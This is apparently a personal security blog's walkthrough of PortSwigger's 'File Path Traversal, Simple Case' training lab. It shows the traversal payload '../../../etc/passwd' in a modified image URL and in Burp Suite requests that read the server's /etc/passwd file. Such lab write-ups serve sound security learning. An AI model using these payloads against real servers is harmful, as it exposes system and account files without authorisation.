---
date: '2025-01-10T15:11:36+06:00'
draft: false
title: 'Portswigger - Path Traversal Lab Walkthrough'
author: 'rakib'
tags:
    - portswigger
    - burpsuite
    - webapp_testing
    - path_traversal
image:
description:
toc: true
---

## Lab #1: File Path Traversal (Simple Case)
This walkthrough explains how to solve the File Path Traversal, Simple Case lab from PortSwigger's Web Security Academy. The lab involves exploiting a path traversal vulnerability to retrieve the contents of the `/etc/passwd` file.

![webpage](/img/blog/path-traversal-web.png)

### Overview
The lab contains a path traversal vulnerability in the display of product images. Our goal is to exploit this vulnerability to retrieve the contents of the `/etc/passwd` file, which typically contains user account information.

### Step 1: Analyze the Vulnerability
1. Navigate to the product images on the website.
2. Right-click on an image and select Open image in new tab.
3. Observe the URL structure. For example:
```
https://0a6100c104fc14ce8136cf040076004e.web-security-academy.net/image?filename=37.jpg
```
4. Notice that the `image` parameter specifies the filename.

![singleimage](/img/blog/20250105221308.png)


### Step 2: Exploit the Vulnerability

Constructing the Payload
1. Modify the `filename` parameter to include a path traversal payload. For example:
```
../../../etc/passwd
```
2. Update the URL:
```
https://0a6100c104fc14ce8136cf040076004e.web-security-academy.net/image?filename=../../../etc/passwd
```
3. Open this modified URL in your browser.
4. If successful, the contests of the `/etc/passwd` file will be displayed.


**Using Burp Suite**

1. Open Burp Suite and configure it to intercept requests.
2. Intercept the request when you navigate to an image. For example:

```
GET /image?filename=37.jpg HTTP/1.1
Host: 0a6100c104fc14ce8136cf040076004e.web-security-academy.net
```
3. Send the intercepted request to Repeater.
4. Modify the filename parameter in the Repeater tab to the path traversal payload:
```
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: 0a6100c104fc14ce8136cf040076004e.web-security-academy.net
```
5. Send the modified request.
6. Verify that the response contains the contents of the `/etc/passwd` file.

![success](/img/blog/20250105222332.png)